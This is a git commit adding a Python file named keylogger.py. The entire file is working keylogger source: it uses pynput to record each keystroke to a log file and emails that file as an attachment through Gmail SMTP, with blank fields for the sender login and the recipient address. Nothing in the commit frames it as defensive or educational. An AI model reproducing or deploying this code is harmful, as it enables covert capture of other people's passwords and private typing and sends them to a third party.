05bae07c62cf73b97f3c282d0fe9cc1cff532467
Prince Mayah <135876893+princemayah@users.noreply.github.com>
2023-08-14 03:28:42 -0500

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,92 @@
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+
+from pynput.keyboard import Key, Listener
+
+keys_information = "key_log.txt"
+email_address = "" # email
+password = "" # password
+
+toaddr = "" # email to send to
+
+file_path = "" # file path to save the file
+extend = "\\"
+
+def send_email(filename, attachment, toaddr):
+
+    fromaddr = email_address
+
+    msg = MIMEMultipart()
+
+    msg['From'] = fromaddr
+
+    msg['To'] = toaddr
+
+    msg['Subject'] = "Log File"
+
+    body = "Body_of_the_mail"
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    filename = filename
+    attachment = open(attachment, 'rb')
+
+    p = MIMEBase('application', 'octet-stream')
+
+    p.set_payload((attachment).read())
+
+    encoders.encode_base64(p)
+
+    p.add_header('Content-Disposition', "attachment; file")
+
+    msg.attach(p)
+
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+
+    s.starttls()
+
+    s.login(fromaddr, password)
+
+    text = msg.as_string()
+
+    s.sendmail(fromaddr, toaddr, text)
+
+    s.quit()
+
+send_email(keys_information, file_path + extend + keys_information, toaddr)
+
+count = 0
+keys = []
+
+def on_press(key):
+    global keys, count
+
+    print(key)
+    keys.append(key)
+    count += 1
+
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys = []
+
+def write_file(keys):
+    with open(file_path + extend + keys_information, "a") as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:
+                f.write('\n')
+                f.close()
+            elif k.find("Key") == -1:
+                f.write(k)
+                f.close()
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
